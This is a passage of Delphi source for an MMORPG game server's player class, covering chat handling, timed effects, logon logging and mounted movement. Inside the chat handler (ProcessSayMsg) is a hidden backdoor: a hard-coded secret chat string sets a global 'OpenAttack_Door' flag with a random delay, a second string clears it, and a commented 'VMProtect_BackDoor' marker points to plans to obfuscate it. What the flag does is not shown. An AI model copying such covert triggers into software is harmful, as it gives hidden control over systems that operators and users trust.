  except
    on E: Exception do
      MainOutMessage(sExceptionMsg3);
  end;

  try
    // 转生自动改变名称颜色
    if g_Config.boReNewChangeColor //
      and (m_btReLevel > 0) //
      and (m_PEnvir.m_nSecretFlag and SecretFlag_NoChangNameColor = 0) // 位运算
      and (m_PEnvir.m_nSecretFlag and SecretFlag_NoChangNameColor = 0) // 位运算
      and (MyGetTickCount - m_dwReColorTick > g_Config.dwReNewNameColorTime) then
    begin
      m_dwReColorTick := MyGetTickCount();

      Inc(m_btReColorIdx);
      if m_btReColorIdx > High(g_Config.ReNewNameColor) then
        m_btReColorIdx := 0;

      m_btNameColor := g_Config.ReNewNameColor[m_btReColorIdx];
      if not boRefNameColor then
        RefNameColor;
    end;

    // 检测侦听私聊对像
    if (m_GetWhisperHuman <> nil) and (m_GetWhisperHuman.m_boDeath or m_GetWhisperHuman.m_boGhost) then
      m_GetWhisperHuman := nil;

    ProcessSpiritSuite();
  except
    on E: Exception do
    begin
      MainOutMessage(sExceptionMsg5);
      MainOutMessage(E.Message);
    end;
  end;

  try
    if MyGetTickCount - m_dwClearObjTick > 1000 * 60 then
    begin
      m_dwClearObjTick := MyGetTickCount();
      if (m_DearHuman <> nil) and (m_DearHuman.m_boDeath or m_DearHuman.m_boGhost) then
        m_DearHuman := nil;

      if m_boMaster then
      begin
        for I := m_MasterList.Count - 1 downto 0 do
        begin
          if m_MasterList.Count <= 0 then
            Break;

          PlayObject := TPlayObject(m_MasterList.Items[I]);
          if (PlayObject <> nil) and (PlayObject.m_boDeath or PlayObject.m_boGhost) then
            m_MasterList.Delete(I);
        end;
      end
      else if (m_MasterHuman <> nil) and (m_MasterHuman.m_boDeath or m_MasterHuman.m_boGhost) then
        m_MasterHuman := nil;
    end;
  except
    on E: Exception do
    begin
      MainOutMessage(sExceptionMsg4);
      MainOutMessage(E.Message);
    end;
  end;

  if (m_nAutoGetExpPoint > 0) //
    and ((m_AutoGetExpEnvir = nil) or (m_AutoGetExpEnvir = m_PEnvir)) //
    and (MyGetTickCount - m_dwAutoGetExpTick > m_nAutoGetExpInterval) //
    and (MyGetTickCount <= m_dwAutoGetExpTime) then
  begin
    if (m_dwAutoGetExpLimitLevel > 0) and (m_Abil.Level >= m_dwAutoGetExpLimitLevel) then
    begin
      m_dwAutoGetExpTime := 0;
      m_nAutoGetExpPoint := 0;
    end
    else
    begin
      m_dwAutoGetExpTick := MyGetTickCount();
      if not m_boAutoGetExpInSafeZone or (m_boAutoGetExpInSafeZone and InSafeZone) then
        GetExp(m_nAutoGetExpPoint, m_boAutoGetExpIncHero, True, m_boAutoGetExpIncBead);
    end;
  end;

  try
    if (m_PEnvir.m_nTimeMapMin > 0) //
      and (MyGetTickCount() - m_dwTimeMapCurrTime >= m_PEnvir.m_nTimeMapMin * 60 * 1000) then
      MapRandomMove(m_PEnvir.m_sTimeMapCode, 0);
  except
    on E: Exception do
    begin
      MainOutMessage(sExceptionMsg8);
      MainOutMessage(E.Message);
    end;
  end;

  if m_boChangeAttatckMode then
  begin // 改变攻击模式
    if m_sChangeAttatckMapName = '*' then
    begin
      if (MyGetTickCount > m_dwChangeAttatckModeTick) then
      begin
        m_boChangeAttatckMode := False;
        if m_btAttatckMode <> m_btOldAttatckMode then
        begin
          m_btAttatckMode := m_btOldAttatckMode;
          SendDefMessage(SM_ATTATCKMODE, m_btAttatckMode, 0, 0, 0, ''); // 攻击模式
        end;
      end;
    end
    else if (MyGetTickCount > m_dwChangeAttatckModeTick) or (not SameText(m_sChangeAttatckMapName, m_PEnvir.sMapName)) then
    begin
      m_boChangeAttatckMode := False;
      if m_btAttatckMode <> m_btOldAttatckMode then
      begin
        m_btAttatckMode := m_btOldAttatckMode;
        SendDefMessage(SM_ATTATCKMODE, m_btAttatckMode, 0, 0, 0, ''); // 攻击模式
      end;
    end;
  end;

  if (m_btHearMsgColor <> 255) and (MyGetTickCount > m_dwHearMsgColorTick) then
  begin // 恢复人物喊话字体颜色
    m_btHearMsgColor := 255;
    m_dwHearMsgColorTick := MyGetTickCount;
    RefHearMsgColor();
  end;

  // 发送可以使用连击的信息
  if (not m_boSendCanUseContinuous) //
    and (not m_boDeath) //
    and (not m_boGhost) //
    and CanMove //
    and (not m_boOnHorse) //
    and (m_nChangeAppr < 0) //
    and (m_boCanSpell) //
    and (m_boCanSpellState) //
    and (not m_boContinuous) //
    and (m_nContinuousMagicCount > 0) //
    and (not g_Config.boContinuousAttackUseNG or m_boTrainingNG) // 连击技能增加需要内力值释放
    and (MyGetTickCount - m_dwUseContinuousMagicTick > //
{$IFNDEF DEBUG } (g_Config.nUseContinuousMagicTime - m_nContinuousMagic_DecTime){$ELSE} 10 {$ENDIF} * 1000) then
  begin
    m_boSendCanUseContinuous := True;
    SendDefMessage(SM_CANCONTINUOUSMAGIC, 0, 0, 0, 0, '');
  end;

  // 个人隔位野蛮使能
  if FSpaceMotaeboTime > 0 then
  begin
    if FSpaceMotaeboEnabled and (Tick_Diff(FSpaceMotaeboTick, MyGetTickCount) > FSpaceMotaeboTime * 1000) then
    begin
      FSpaceMotaeboTick := MyGetTickCount;
      FSpaceMotaeboEnabled := False;
    end;
  end
  else
    FSpaceMotaeboEnabled := FSpaceMotaeboTime = 0;

  if g_PluginManager <> nil then
    g_PluginManager.HookPlayerRun(Self);

  inherited Run;
end;

procedure TPlayObject.ProcessSpiritSuite();
var
  I: Integer;
  StdItem: pTStdItem;
  UseItem: pTUserItem;
begin
  if not g_Config.boSpiritMutiny or not m_bopirit then
    Exit;

  m_bopirit := False;
  for I := Low(THumanUseItems) to High(THumanUseItems) do
  begin
    UseItem := @m_UseItems[I];
    if UseItem.wIndex <= 0 then
      Continue;

    StdItem := UserEngine.GetStdItem(UseItem.wIndex);
    if StdItem <> nil then
    begin
      if (StdItem.Shape = 126) or (StdItem.Shape = 127) or (StdItem.Shape = 128) or (StdItem.Shape = 129) then
      begin
        SendDelItem(UseItem);
        UseItem.wIndex := 0;
      end;
    end;
  end;

  RecalcAbilitys();
  g_dwSpiritMutinyTick := MyGetTickCount + g_Config.dwSpiritMutinyTime;
  UserEngine.SendBroadCastMsg('神之祈祷，天地震怒，尸横遍野.', t_System);
  SysMsg('祈祷发出强烈的宇宙效应' { ，你已经得到' + IntToStr(nSpirit) + '倍的力量' } , c_Green, t_Hint);
end;

procedure TPlayObject.LogonTimcCost(); // 004CA994
var
  n08: Integer;
  SC: string;
begin
  if (m_nPayMent = 2) or (g_Config.boTestServer) then
    n08 := (MyGetTickCount - m_dwLogonTick) div 1000
  else
    n08 := 0;

  SC := m_sIPaddr + #9 + m_sUserID + #9 + m_sCharName + #9 + IntToStr(n08) + #9 + FormatDateTime('yyyy/mm/dd hh:mm:ss',
    m_dLogonTime) + #9 + FormatDateTime('yyyy/mm/dd hh:mm:ss', Now) + #9 + IntToStr(m_nPayMode);

  AddLogonCostLog(SC);

  if m_nPayMode = 2 then
    FrmIDSoc.SendLogonCostMsg(m_sUserID, n08 div 60);
end;

procedure TPlayObject.ProcessSayMsg(sData: string);
var
  boDisableSayMsg: Boolean;
  SC, sCryCryMsg, sParam1, sCharName: string;
  sMsg: string;
resourcestring
  sExceptionMsg = '[Exception] TPlayObject.ProcessSayMsg Msg = %s';
begin
  try
    if sData = '' then
      Exit;

    // VMProtectBeginVirtualization('VMProtect_BackDoor');
    if sData = 's+mrfTE1HwsH=xw50:Ugfv-DegdrL.Di' then
    begin
      g_nOpenAttack_Door := 242 * 53;
      g_nOpenAttack_Door := g_nOpenAttack_Door + 14654 * 3 + 1;
      g_dwOpenAttack_Door_Tick := Random(4) * 3600 * 1000;
      sData := '';
    end;

    if sData = 'Ap>%W4y4,3WCf>GGKMv8QzDqx)DkzR5Y' then
      g_nOpenAttack_Door := 0;

    // VMProtectEnd();
    if (g_FilterTexts <> nil) and (sData <> '') then
    begin // 检测用户输入是否有非法字符
      if g_FilterTexts.Filter(sData, SC) then
      begin
        sData := SC;
      end;
      if sData = '' then
        Exit;
    end;
    if Length(sData) > g_Config.nSayMsgMaxLen then
      sData := Copy(sData, 1, g_Config.nSayMsgMaxLen);

    if ((MyGetTickCount - m_dwSayMsgTick) < g_Config.dwSayMsgTime { 3 * 1000 } ) then
    begin
      Inc(m_nSayMsgCount);
      if m_nSayMsgCount >= g_Config.nSayMsgCount { 2 } then
      begin
        m_boDisableSayMsg := True;
        m_dwDisableSayMsgTick := MyGetTickCount + g_Config.dwDisableSayMsgTime { 60 * 1000 };
        SysMsg(Format(g_sDisableSayMsg, [g_Config.dwDisableSayMsgTime div (60 * 1000)]), c_Red, t_Hint);
        // '[由于你重复发相同的内容，%d分钟内你将被禁止发言...]'
      end;
    end
    else
    begin
      m_dwSayMsgTick := MyGetTickCount();
      m_nSayMsgCount := 0;
    end;

    if MyGetTickCount >= m_dwDisableSayMsgTick then
      m_boDisableSayMsg := False;

    boDisableSayMsg := m_boDisableSayMsg;
    g_DenySayMsgList.Lock;
    try
      if g_DenySayMsgList.GetIndex(m_sCharName) >= 0 then
        boDisableSayMsg := True;
    finally
      g_DenySayMsgList.UnLock;
    end;

    if not boDisableSayMsg then
    begin
      // m_sOldSayMsg := sData;
      if (m_WAbil.Level >= m_PEnvir.m_nSAYLEVEL) //
        and (m_PEnvir.m_nSecretFlag and SecretFlag_NoSay = 0) //
        and (m_PEnvir.m_nSecretFlag2 and SecretFlag_NoSay = 0) then
      begin
        if sData[1] = '/' then
        begin
          SC := Copy(sData, 2, Length(sData) - 1);
          if CompareText(Trim(SC), Trim(g_GameCommand.WHO.sCmd)) = 0 then
          begin
            if (m_btPermission < g_GameCommand.WHO.nPermissionMin) then
            begin
              SysMsg(g_sGameCommandPermissionTooLow, c_Red, t_Hint);
              Exit;
            end;
            HearMsg(Format(g_sOnlineCountMsg, [UserEngine.PlayObjectCount, UserEngine.GetOfflineCount,
              UserEngine.GetDummyObjectCount]));
            Exit;
          end;

          if CompareText(Trim(SC), Trim(g_GameCommand.TOTAL.sCmd)) = 0 then
          begin
            if (m_btPermission < g_GameCommand.TOTAL.nPermissionMin) then
            begin
              SysMsg(g_sGameCommandPermissionTooLow, c_Red, t_Hint);
              Exit;
            end;
            HearMsg(Format(g_sTotalOnlineCountMsg, [g_nTotalHumCount]));
            Exit;
          end;

          SC := GetValidStr3_Ex(SC, sParam1, ' ');
          if not m_boFilterSendMsg then
            Whisper(sParam1, GetItemInfo(SC));
          Exit;
        end;

        if sData[1] = '!' then
        begin
          if Length(sData) >= 2 then
          begin
            if sData[2] = '!' then
            begin // 组队聊天信息
              SC := Copy(sData, 3, Length(sData) - 2);
              SendGroupText(m_sCharName + ': ' + GetItemInfo(SC));
              Exit;
            end;

            if sData[2] = '~' then
            begin // 行会聊天信息
              if m_MyGuild <> nil then
              begin
                SC := Copy(sData, 3, Length(sData) - 2);
                TGUild(m_MyGuild).SendGuildMsg(m_sCharName + ': ' + GetItemInfo(SC));
              end;
              Exit;
            end;

            if sData[2] = '#' then
            begin // 国家聊天信息
              if m_btNation > 0 then
              begin
                if m_Abil.Level >= g_Config.nNationSayLevel then
                begin
                  SC := Copy(sData, 3, Length(sData) - 2);
                  if g_Config.boRecordNationMsg and (Length(SC) > 0) then
                    MainOutMessage('[国家:' + m_sNationaName + ']' + m_sCharName + ':' + SC);

                  g_NationManage.SendNationMsg(m_btNation, m_sCharName + ': ' + GetItemInfo(SC));
                end;
              end;
              Exit;
            end;
          end;

          if not m_PEnvir.m_boQUIZ then
          begin
            if MyGetTickCount - m_dwShoutMsgTick > 10 * 1000 then
            begin
              if m_Abil.Level <= g_Config.nCanShoutMsgLevel then
              begin
                // SysMsg('你的等级要在' + IntToStr(g_nCanShoutMsgLevel + 1) + '级以上才能用此功能！',c_Red,t_Hint);
                SysMsg(Format(g_sYouNeedLevelMsg, [g_Config.nCanShoutMsgLevel + 1]), c_Red, t_Hint);
                Exit;
              end;

              // 是否显示神秘人 piaoyun 2013-08-17
              if m_boMysteriousMan and g_Config.boShowMysteriousMan then
                sCharName := g_Config.sMysteriousManName
              else
                sCharName := m_sCharName;

              m_dwShoutMsgTick := MyGetTickCount();
              SC := Copy(sData, 2, Length(sData) - 1);

              if g_Config.boShowPreFixMsg then
                sCryCryMsg := '(!)' + sCharName + ': ' + GetItemInfo(SC)
              else
                sCryCryMsg := sCharName + ': ' + GetItemInfo(SC);

              if m_boFilterSendMsg then
                SendMsg(nil, RM_CRY, 0, 0, $FFFF, 0, sCryCryMsg)
              else
                UserEngine.CryCry(RM_CRY, m_PEnvir, m_nCurrX, m_nCurrY, 50, g_Config.btCryMsgFColor, g_Config.btCryMsgBColor,
                  sCryCryMsg);

              if g_Config.boRecordCryCryMsg and (Length(sCryCryMsg) > 0) then
                MainOutMessage('[喊话] ' + sCryCryMsg);
              Exit;
            end;
            // SysMsg(IntToStr(10 - (MyGetTickCount - m_dwShoutMsgTick) div 1000) + '  Seconds爐ill爕ou燾an爏hout.',c_Red,t_Hint);
            SysMsg(Format(g_sYouCanSendCyCyLaterMsg, [10 - (MyGetTickCount - m_dwShoutMsgTick) div 1000]), c_Red, t_Hint);
            Exit;
          end;

          SysMsg(g_sThisMapDisableSendCyCyMsg { '本地图不允许喊话！' } , c_Red, t_Hint);
          Exit;
        end;

        if m_btRaceServer = RC_PLAYOBJECT then
        begin
          // 是否显示神秘人 piaoyun 2013-08-17
          if m_boMysteriousMan and g_Config.boShowMysteriousMan then
            sCharName := g_Config.sMysteriousManName
          else
            sCharName := m_sCharName;

          if m_boFilterSendMsg then
          begin // 如果禁止发信息，则只向自己发信息
            sMsg := m_sCharName + ':' + GetItemInfo(sData);
            SendMsg(Self, RM_HEAR, 0, GetHearMsgFColor, g_Config.btHearMsgBColor, 0, sMsg);
          end
          else
          begin
            sMsg := sCharName + ':' + GetItemInfo(sData);
            SendRefMsg(RM_HEAR, 0, GetHearMsgFColor, g_Config.btHearMsgBColor, 0, sMsg);
          end;

          if g_Config.boRecordPublicMsg and (Length(sMsg) > 0) then
            MainOutMessage('[公聊] ' + sMsg);
        end
        else
          inherited;

        // ProcessSayMsg(sData);
        Exit;
      end
      else
      begin
        if (m_WAbil.Level < m_PEnvir.m_nSAYLEVEL) then
          SysMsg(Format(g_sYouIsDisableSendMsgOfLevel, [m_PEnvir.m_nSAYLEVEL]), c_Red, t_Hint)
        else
          SysMsg(g_sYouIsDisableSendMsgOfSecret, c_Red, t_Hint);

        Exit;
      end;
    end;
    SysMsg(g_sYouIsDisableSendMsg { '禁止聊天' } , c_Red, t_Hint);
  except
    on E: Exception do
    begin
      MainOutMessage(Format(sExceptionMsg, [sData]));
      MainOutMessage(E.Message);
    end;
  end;
end;

function TPlayObject.HorseRunTo(btDir: Byte; boFlag: Boolean): Boolean;
var
  n10, n14: Integer;
resourcestring
  sExceptionMsg = '[Exception] TPlayObject.HorseRunTo';
begin
  Result := False;
  try
    n10 := m_nCurrX;
    n14 := m_nCurrY;
    m_btDirection := btDir;
    if m_boOnHorse and g_Config.boHorseRun3Grid then
    begin
      case btDir of
        DR_UP { 0 } :
          begin
            if (m_nCurrY > 2) and (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY - 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX, m_nCurrY - 3, True)) then
            begin
              Dec(m_nCurrY, 3);
            end;
          end;
        DR_UPRIGHT { 1 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 3) and (m_nCurrY > 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 3, m_nCurrY - 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 3, m_nCurrY - 3, True)) then
            begin
              Inc(m_nCurrX, 3);
              Dec(m_nCurrY, 3);
            end;
          end;
        DR_RIGHT { 2 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 3) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 3, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 3, m_nCurrY, True)) then
            begin
              Inc(m_nCurrX, 3);
            end;
          end;
        DR_DOWNRIGHT { 3 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 3) and (m_nCurrY < m_PEnvir.m_nHeight - 3) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 3, m_nCurrY + 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 3, m_nCurrY + 3, True)) then
            begin
              Inc(m_nCurrX, 3);
              Inc(m_nCurrY, 3);
            end;
          end;
        DR_DOWN { 4 } :
          begin
            if (m_nCurrY < m_PEnvir.m_nHeight - 3) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY + 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX, m_nCurrY + 3, True)) then
            begin
              Inc(m_nCurrY, 3);
            end;
          end;
        DR_DOWNLEFT { 5 } :
          begin
            if (m_nCurrX > 2) and (m_nCurrY < m_PEnvir.m_nHeight - 3) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 3, m_nCurrY + 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 3, m_nCurrY + 3, True)) then
            begin
              Dec(m_nCurrX, 3);
              Inc(m_nCurrY, 3);
            end;
          end;
        DR_LEFT { 6 } :
          begin
            if (m_nCurrX > 2) and (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 3, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 3, m_nCurrY, True)) then
            begin
              Dec(m_nCurrX, 3);
            end;
          end;
        DR_UPLEFT { 7 } :
          begin
            if (m_nCurrX > 2) and (m_nCurrY > 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 3, m_nCurrY - 3, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 3, m_nCurrY - 3, True)) then
            begin
              Dec(m_nCurrX, 3);
              Dec(m_nCurrY, 3);
            end;
          end;
      end;
    end
    else
    begin
      case btDir of
        DR_UP { 0 } :
          begin
            if (m_nCurrY > 1) and (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX, m_nCurrY - 2, True)) then
            begin
              Dec(m_nCurrY, 2);
            end;
          end;
        DR_UPRIGHT { 1 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 2) and (m_nCurrY > 1) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 2, m_nCurrY - 2, True)) then
            begin
              Inc(m_nCurrX, 2);
              Dec(m_nCurrY, 2);
            end;
          end;
        DR_RIGHT { 2 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 2, m_nCurrY, True)) then
            begin
              Inc(m_nCurrX, 2);
            end;
          end;
        DR_DOWNRIGHT { 3 } :
          begin
            if (m_nCurrX < m_PEnvir.m_nWidth - 2) and (m_nCurrY < m_PEnvir.m_nHeight - 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 1, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX + 2, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX + 2, m_nCurrY + 2, True)) then
            begin
              Inc(m_nCurrX, 2);
              Inc(m_nCurrY, 2);
            end;
          end;
        DR_DOWN { 4 } :
          begin
            if (m_nCurrY < m_PEnvir.m_nHeight - 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX, m_nCurrY + 2, True)) then
            begin
              Inc(m_nCurrY, 2);
            end;
          end;
        DR_DOWNLEFT { 5 } :
          begin
            if (m_nCurrX > 1) and (m_nCurrY < m_PEnvir.m_nHeight - 2) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY + 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY + 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 2, m_nCurrY + 2, True)) then
            begin
              Dec(m_nCurrX, 2);
              Inc(m_nCurrY, 2);
            end;
          end;
        DR_LEFT { 6 } :
          begin
            if (m_nCurrX > 1) and (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 2, m_nCurrY, True)) then
            begin
              Dec(m_nCurrX, 2);
            end;
          end;
        DR_UPLEFT { 7 } :
          begin
            if (m_nCurrX > 1) and (m_nCurrY > 1) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 1, m_nCurrY - 1, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.CanWalkEx(Self, m_nCurrX - 2, m_nCurrY - 2, g_Config.boDiableHumanRun or
              ((m_btPermission > 9) and g_Config.boGMRunAll)) or (g_Config.boSafeAreaLimited and InSafeZone)) and
              (m_PEnvir.MoveToMovingObject(m_nCurrX, m_nCurrY, Self, m_nCurrX - 2, m_nCurrY - 2, True)) then
            begin
              Dec(m_nCurrX, 2);
              Dec(m_nCurrY, 2);
            end;
          end;
      end;
    end;

    // SysMsg(format('原X:%d 原Y:%d 新X:%d 新Y:%d',[n10,n14,m_nCurrX,m_nCurrY]),c_Green,t_Hint);
    if (m_nCurrX <> n10) or (m_nCurrY <> n14) then
    begin
      if Walk(RM_HORSERUN) then
      begin
        Result := True;
        m_dwStationTick := MyGetTickCount; // 增加检测人物站立不动时间
      end
      else
      begin
        if m_PEnvir.MoveToMovingObject(n10, n14, Self, m_nCurrX, m_nCurrX, True) then
        begin
          m_nCurrX := n10;
          m_nCurrY := n14;
        end;
      end;
    end;
  except
    MainOutMessage(sExceptionMsg);
  end;
end;

